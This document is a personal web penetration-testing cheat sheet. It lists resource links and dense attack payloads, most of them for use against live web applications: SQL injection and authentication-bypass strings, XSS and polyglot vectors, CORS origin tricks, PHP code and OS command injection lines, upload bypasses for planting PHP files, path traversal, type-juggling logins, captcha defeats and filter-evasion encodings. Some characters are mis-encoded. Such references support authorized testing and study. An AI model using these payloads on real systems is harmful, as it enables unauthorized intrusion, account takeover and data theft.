# pentest

https://github.com/enaqx/awesome-pentest
http://code.google.com/p/pentest-bookmarks/wiki/BookmarksList
https://github.com/dloss/python-pentest-tools
https://github.com/Sh0ckFR/Infosec-Useful-Stuff

# checklist
https://github.com/OWASP/wstg/tree/master/document or http://www.owasp.org/index.php/Testing_Checklist
http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
http://www.pentest-standard.org

# tools
https://www.owasp.org/index.php/Phoenix/Tools
http://oss-security.openwall.org/wiki/tools
http://blackarch.org/tools.html
http://www.win.tue.nl/~aeb/linux/hh/hh.html

# search for known exploits
locate -i
~/Documents/kb/
~/Documents/exploits/{exploit-database,packetstorm,vulndbs}

site:seclists.org KEYWORD <- many lists
site:lists.grok.org.uk KEYWORD <- full disclosure only
site:cvedetails site:attackerkb.com site:cvebase.com

www.intelligentexploit.com ...
metasploit modules, nmap nse
grep keyword blackarch,pentoo,kali,...
learn about technology, test on a local install
admin interfaces: https://www.whitehatsec.com/bAdmin/bAdmin.html

# testing
* type cast issues / trigger error messages
?a=1&a[]=1
?x[y]=1&x[y]z=2
?foo=bar and ?foo[]=bar if same response maybe app casts array to string
/nul IIS

* source code leak
http://a.com/index.jsp::$DATA or .JSP or .jsp. or jsp%20
http://a.com/myapp/%252e%252e/manager/html mod_jk
http://a.com/index.jsp%01 (http://secalert.net/#scl-soh)
http://a.com/index.js%70 (WebLogic http://www.securityfocus.com/bid/2527/exploit)
http://a.com/examples/snp/snoop%252ejsp (Tomcat http://www.securityfocus.com/bid/2527/exploit)
http://a.com/login.JsP (IBM Websphere http://www.securityfocus.com/bid/1328/info)
http://a.com/login.jsp%20 (Netscape Web Server http://www.securityfocus.com/bid/273/discuss)
http://a.com/%3f.jsp (Allaire JRun Root http://www.securityfocus.com/bid/3592/discuss)
http://a.com///[1-4096 slashes here]/admin/* (Apache long slash path directory listing http://www.securityfocus.com/bid/2503/discuss)
http://a.com/%5cadmin/ (BEA WebLogic Directory Traversal with %00, %2e, %2f and %5c via:http://www.securityfocus.com/bid/2513/discuss)

* cgi
shellshock
/cgi-bin/test-cgi?/* and /cgi-bin/test-cgi?* https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/ http://insecure.org/sploits/test-cgi.server_protocol.html

* polyglot http://www.slideshare.net/MathiasKarlsson2/polyglot-payloads-in-practice-by-avlidienbrunn-at-hackpra
mysql: +or+SLEEP(10)/*'or+SLEEP(10)+or'"or+SLEEP(10)+or"*/ urlencoded: %20or%20sleep%2810%29/%2a%27or%20sleep%2810%29%20or%27%22or%20sleep%2810%29%20or%22%2a/
xss: " onclick=alert(1)//<button value=Click_Me ' onclick=alert(1)//> */ alert(1); /* 
aio: /*! SLEEP(1) /*/ onclick=alert(1)//<button value=Click_Me /*/*/ or' /*! or SLEEP(1) or /*/, onclick=alert(1)//> /*/*/'or" /*! or SLEEP(1) or /*/, onclick=alert(1)// /*/*"/** /*!/*/ // /*/*/
more: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
more xss: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
using BENCHMARK instead of SLEEP: https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/

* xss
leverage error pages/sqli errors/... (send encoded xss, response returns error page with decoded payload)
utf-7
upload .stm file IIS serves them as text/html https://twitter.com/ldionmarcil/status/922553386645454850
<script><im<script>g onerror=.. -> <img onerror=..
<svg/onload=..

* cors https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
send Origin: https://evil.net (many servers dynamically generate Access-Control-Allow-Origin: based on user-supplied Origin:)
send Origin: https://evillegit.com if site only trusts legit.com
send Origin: https://legit.com.evil.net if site only trusts https://legit.com
send Origin: null failing to configure an origin whitelist in certain applications may result in Access-Control-Allow-Origin: null and the null origin can be obtained using a sandboxed iframe <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>cors stuff here</script>â€™></iframe>)
send Origin: https://legit.com`.evil.net/ URL parsing vuln in Safari with http://legit.com%60.evil.net/exploit.html
send Origin: http://evil.net failing to restrict the origin protocol -> mitm
chck Vary: Origin header is always sent

* sqli
?id=!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~  // id=%21%22%23%24%25%26%27%28%29%2A%2B%2C-.%2F%3A%3B%3C%3D%3E%3F%40%5B%5C%5D%5E_%60%7B%7C%7D%7E
' '' " "" \ \\ \' \" ... ) -- )--
?id=1`--+-
%2527 %2522 ... %252527 ...
?login=%bf%27 # bypass mysql-real-escape-string (db driver and db don't talk same charset)
send even and odd numbers of ' (filter doubles up single quotes but truncates input to N chars)
stacked, time-based, second order
rtfm keywords/escaping
select 1 from users where login = "login" and password = "password" => 1 # sqlite
select * from users where username = 'a'+'b' and password = 'a'+'b' => returns first user whose username and password doesn't start with a numeric value (mysql:  http://vagosec.org/2013/04/mysql-implicit-type-conversion/ and other operators possible) # sqli waf evasion
select * from users where username = 0 => returns all records because column is of type varchar (every username is converted into a double, and 0=0 is true)
select 'foo'+0 = 0 => 1 (true) 
select 'a'+'666' => 666 (double value)

login=user1&password=') or 1=1 limit 0,1 --%20 # bypass auth
query: "SELECT * FROM haxorz_memberz WHERE login = '%s' AND password = MD5('%s')"
code: if (@mysql_num_rows($sql) == 1)

* sqli in order by (MySQL)
?order=book_id+DESC
?order=book_id`,`book_name
?order=IF(1,book_id,book_name)

* parameters to test
GET, POST, Cookie, User-Agent, Host, Referer, X-Forwarded-For, X-Forwarded-Host, Origin, Accept-Language ...

X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 175.45.177.64 try the hostname's IP or the interface IP etc.

Proxy: 127.0.0.1:1 (https://httpoxy.org)

* bypass IP whitelisting
X-Forwarded-For: 0000::1 (RoR 4.2 Web Console https://gist.github.com/joernchen/d868521352f1ccd25095)

* authentication
incomplete validation: remove last character of long password, change case, remove specials
password hash collision / php operator ==
register Admin to login as admin # MySQL performs a case insensitive comparison by default
register admin%20 to login as admin # MySQL ignores trailing spaces when performing string comparison
register admin++++...++++x column truncation (http://www.notsosecure.com/blog/2008/09/11/sql-column-truncation-vulnerabilities/ http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/ http://www.sektioneins.com/en/advisories/advisory-052008-wordpress-user_login-column-sql-truncation-vulnerability.html)
register admin+lulz@company.com, register "admin"
/activate/?activation_code= -> SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1 # login w/o password as the first account
/login?username[]=admin&password=
/login?username=admin&password[]=a -> strcmp($expectedpw, $_GET['password') == 0
/login?username=admin&password[password]=1 -> and password=`password`=1; is true in mysql

* race conditions
register account with multiple emails, use a coupon multiple times etc.

* authentication bypass
cookie: $username|$expiry|$hmac => hmac_md5(admin1|1353464343, $key) == hmac(admin|11353464343, $key) (wordpress) or bf $key (rack)
type juggling in php or other (http://www.php.net/manual/en/language.types.type-juggling.php) var_dump('1abcdef' == 1); => true. Or stuff like strcmp, ==, equals ... (http://turbochaos.blogspot.com.au/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
var_dump("0e1234" == "0e4321"); => true (0 multiplied by anything is still 0) useful if server does: if (hmac(..) == hmac(..))
try with empty password (ldap unauthenticated authentication)

* authentication bypass (session puzzling)
hit the forgotpw page with the admin login to get an authenticated admin cookie (SEPM CVE-2015-1486)
hit the register page with the admin login while authenticated as a lambda user to change session (seam, mellivora)

* authentication bypass (mass assignment / autobinding)
https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet

* reset forgot pw
mysql 1="1abc" => true and 0="abc" => true so request /reset?token=0 (http://phrack.org/issues/69/12.html)
opencfp reset token is NULL in db by default so request ?reset_token=%00 (opencfp bug http://haxx.ml/post/149975211631/how-i-hacked-your-cfp-and-probably-some-other)
send more than one reset password request at the same time, or http pipeline multiple requests (dont update content-length or send Connection: close)
integer key truncation like php in 2015, send id of 4294967296: var_dump([0 => 0] === [0x100000000 => 0]); // bool(true) https://bugs.php.net/bug.php?id=69892

* captcha
remove captcha_answer= parameter from request
leaked in src or cookie
re-submit same answer w/ same cookie
limited number of words (solve with a hash lookup table)
tesseract-ocr ou gocr ou ssocr
remove blue grid from image : Image('captcha.png').point(lambda p: p>0 and 255).save('clean.png') # blank everything that's not black
un-implode
SentryMBA

* server side include
<!--#printenv -->

* server side template injection (ssti)
http://blog.portswigger.net/2015/08/server-side-template-injection.html
http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html
https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
{{7*7}}
<%= 7*7 %>

* expression language injection
${777-111} #{777-111} %{777-111}
see ./java

* code injection
search.php?q={${phpinfo()}} // http://secalert.net/#ebay-rce-ccs
try echo pi in case input is eval'd by PHP app
in PHP usort: ?order=id);}system('uname%20-a');//
in PHP assert: ?vuln=hacker'.phpinfo().' -> assert('hacker'.phpinfo().'

* OS command injection
try commands that don't return any output or only return one word: sleep/ping/pwd/whoami
or get output through out-of-band
or ip=127.0.0.1%0a`id`>/var/www/public/results.txt

* xml, xpath, ldap injection
see ./twahh

* SMTP
%0aCc:
%0d%0aBcc:
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:...

* upload
change extension to .php[3-7], .phtml, .pht, .phar, .php.xyz, .xhtml, .shtml, .stm. .shtm, ..., .html, .htm, .htt, .mht, .thtml, .svg, .xml
upload AAAA...AA.php.txt so server truncates extention (e.g. filename length restriction)
upload lol.pphphp
upload lol.php.csv
upload .htaccess to enable another allowed extension to be run by PHP
upload evil.php with Content-Type: image/jpg in case app checks the MIME type
upload evil.jpg with PHP code inside image
upload evil.png acess uploads/evil.png/x.php (see ./nginx)
upload imagetragick (im relies on the magic header so even if app checks extension you can upload a .mvg or .svg file as evil.png)

* passive scanning
parse image responses for sql errors, path/ip disclosures etc.

* path traversal / LFI
try ../ then ../../ then ../../../ (can get an error on first 2 but success on 3rd)
....// (evasion, more below)
try ../flagÃ©Ã©Ã©Ã© (truncates extension appended by server because length(Ã©)==2)
try /static../secret/flag.php (nginx alias traversal)

* randomness
crack seed https://github.com/altf4/untwister

* iis
http://srv/web/blah\..\jobMail.asp

* inter-protocol exploitation
e.g. server does not sanitize dns response from attacker's domain => xss, sqli, rce ...

* heartbleed
ESX & ESXi are vuln

* dos
hashtable collisions (http://www.phpinternalsbook.com/hashtables/hash_algorithm.html)
php CVE-2018-5711 + gif upload

* bypass checks
python: ?bet=NaN -> float('Nan') > 100 is True or float-point precision: 1*1 + 0.1*1 - 1*1 - 0.1*1 is > 0
php: ?str1[]=a&str2[]=b -> md5($str1) === md5($str2) is True
utf

* bypass path filter
///index.php <- php parse_url() bypass
/;/index

# evasion
always keep in mind that filters and weird setups can alter your inputs
cap strings, add stuff, replace/remove characters, triple the = sign ...
windows: change case, use 8.3 file/dir names, insert unsupported chars (<, : etc.) that will be automatically removed

SeLeCt
selselectect
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
....//
etc.

$id = str_replace(' ', '', $id);
if (!preg_match('/^\d+$/m', $id)) { die(); }
$id = preg_replace('/^[^\d]+$/', '', $id); // won't replace "a1"
=> bypass all 3 filters with "1%0A)or(1)%23"
expl: "0%0a)union/**/select/**/null"

* whitespace
%09 %0d %0a %20 ...
add more than one of each type

* url encoding
s%65lect
s%2565lect
s%elect

* multiline regex
id=123\nPAYLOAD

* comments
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users // mysql only

* string concatenation
MySQL: concat('adm','in')
Oracle: 'adm'||'in'
MS-SQL: 'adm'+'in'

exec('sel' + 'ect * fro' + 'm users')

* alternate IP encoding (https://prezi.com/fffqa6n75gbm/zeronights-2014-hunting-for-top-bounties/)
https://github.com/IceM4nn/IP-Obfuscator
127.0.0.1
2130706433
0x7f000001
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
ping 010.010.010.010; ping 127.1; ping 0177.1; ping 0x7f.1; ping 0; man inet_aton (You can use/mix decimal/octal/hex, omit some/most octets)

http://425.510.425.510/ dotted decimal with overflow
http://2852039166/ dotless decimal
http://7147006462/ dotless decimal with overflow
http://0xA9.0XFE.0XA9.0XFE/ dotted hexadecimal
http://0xA9FEA9FE/ dotless hexadecimal
http://0x41414141A9FEA9FE/ dotless hexadecimal with overflow
more in Server Side Browsing by @agarri

* utf-7
def utf7(s): # Illegal but accepted UTF7, useful for some blacklists
  return ''.join('+%s-' % b64encode('\x00' + c).rstrip('=') for c in s)

* utf-16
U-FF2e http://graphemica.com/%ef%bc%ae get(u'u\uff2e./flag.txt') (in case "ï¼®ï¼®" is blacklisted)
U-012f http://graphemica.com/%c4%ae http://www.fileformat.info/info/unicode/char/012e/index.htm get(u'\u012e\u012e/flag.txt') (in case "ï¼®" is blacklisted)

* path traversal
           URL-encoding | 16-bit unicode-encoding | double URL-encoding | overlong UTF-8 unicode-encoding
dot            %2e      | %u002e                  | %252e               | %c0%2e  %e0%40%ae  %c0ae  etc.
forward slash  %2f      | %u2215                  | %252f               | %c0%af  %e0%80%af  %c0%2f etc.
backslash      %5c      | %u2216                  | %255c               | %c0%5c  %c0%80%5c  etc.
null byte      %00                                                      | %c0%80

hex(0x80 + ord('/')) -> %c0%af

' = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7
" = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2
< = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb
& = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6
\0= %00 = %c0%80 = %e0%80%80 = %f0%80%80%80
